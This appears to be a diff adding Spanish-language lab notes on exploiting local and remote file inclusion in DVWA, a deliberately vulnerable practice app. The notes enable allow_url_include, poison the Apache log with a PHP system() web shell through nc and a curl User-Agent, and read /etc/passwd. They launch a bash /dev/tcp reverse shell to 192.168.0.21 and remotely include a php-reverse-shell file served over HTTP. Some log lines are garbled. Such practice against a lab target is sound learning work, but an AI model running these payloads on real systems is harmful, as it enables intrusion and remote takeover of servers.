@@ -1,0 +1,70 @@
+#################################################################################
+CONFIGURAMOS "DVWA" para explotar la vulnerabilidad de "LFI/RFI" con los siguiente comando
+1=docker exec -it 6673b7af3fe7 /bin/bash
+2=$ sed -i 's/allow_url_include = Off/allow_url_include = On/' /etc/php/7.0/apache2/php.ini
+3=:grep allow_url_* /etc/php/7.0/apache2/php.ini
+allow_url_fopen = On
+allow_url_include = On
+4=cat /etc/passwd
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+5=usermod -a -G adm www-data
+6=groups www-data
+www-data : www-data adm
+#################################################################################
+
+
+#LEVEL_LOW "DVWA"
+1=http://localhost:9000/vulnerabilities/fi/?page= https://www.google.com
+2=http://localhost:9000/vulnerabilities/fi/?page=/var/log/apache2/access.log
+hacemos una peticion con "nc localhost 9000"
+3=nc localhost 9000
+GET /test
+HTTP/1.1" 200 3063 "-" "Mozilla/5.0 (X11; Linux x84) AWebKit/537.36 (KHTML, like Gecko) Chrome/.0.0.0 Sri/537.36" 17.0.1 - - [10/Jan/2023:00:28:04 +0000] "GET /test\n" 400 0 "-" "-"
+4=nc localhost 9000
+GET /<?php system($_GET['cmd']); ?>
+5=http://localhost:9000/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=ls
+6=nc -nlvp 53
+6=http://localhost:9000/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.21%2F53%200%3E%2
+
+#LEVEL_MEDIUM "DVWA" es lo mismo que "LEVEL_LOW"
+
+#LEVEL_HIGH "DVWA"
+1=http://localhost:9000/vulnerabilities/fi/?page=file:///var/log/apache2/access.log
+hacemos una peticion con "nc localhost 9000"
+3=nc localhost 9000
+GET /test
+HTTP/1.1" 200 3063 "-" "Mozilla/5.0 (X11; Linux x86_64) ApbKit/537.36 (KHTML, ) Chrome/10.0 Sari/537.36" 17.0.1 - - [10/Jan:00:28:04 +0000] "GET /test\n" 400 0 "-" "-"
+4=nc localhost 9000
+GET /<?php system($_GET['cmd']); ?>
+5=http://localhost:9000/vulnerabilities/fi/?page=file:///var/log/apache2/access.log&cmd=ls
+6=nc -nlvp 53
+6=http://localhost:9000/vulnerabilities/fi/?page=file:///var/log/apache2/access.log&cmd=bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.21%2F53%200%3E%2
+
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+MODIFICAR EL "USER AGENT" con "CURL" >>>>> LFI/RCE
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+1=curl http://localhost:9000/ -A "holaaaaaaaaaa hackers"
+"Moza/5.0 (X11; L x86_64) ApbKit/537.36 (KHTML, like Gecko) Chrome/0.0.0 Sai/56" 1720.1 - - [10/Jan/20214:30 +0000] "GET / HTTP/1.1" 302 423 "-" "TEAMO MICAELA"
+2=curl http://localhost:9000/ -A "<?php system($_GET['cmd']); ?>"
+zsh: bad math expression: operand expected at `'cmd'' ======> escapear con ""\$""
+2.1=curl http://localhost:9000/ -A "<?php system(\$_GET['cmd']); ?>"
+3=http://localhost:9000/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=cat%20/etc/passwd
+4=http://localhost:9000/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.21%2F53%200%3E%2
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+##################################################################################
+#LFI/RFI
+CREAR UN ARCHIVO MALICIOSA EN PHP QUE Y QUE LA PAGINA EJECUTE NUESTRO ARCHIVO
+1=locate webshell
+2=cp /usr/share/webshells/php/php-reverse-shell.php . | mv php-reverse-shell.php shell.txt
+3=nano shell.txt
+$ip = '192.168.0.21';  // CHANGE THIS
+$port = 53;       // CHANGE THIS
+4=python3 -m http.server 8080 #Levantar el servido
+4.1=localhost:8080/shell.txt       =======>VER FILE "shell.txt" en el navegador
+5=http://localhost:9000/vulnerabilities/fi/?page=http://192.168.0.21:8080/shell.txt
+6=nc -nlvp 53                              #Al escucha
+$ 
+
+
+
+##################################################################################
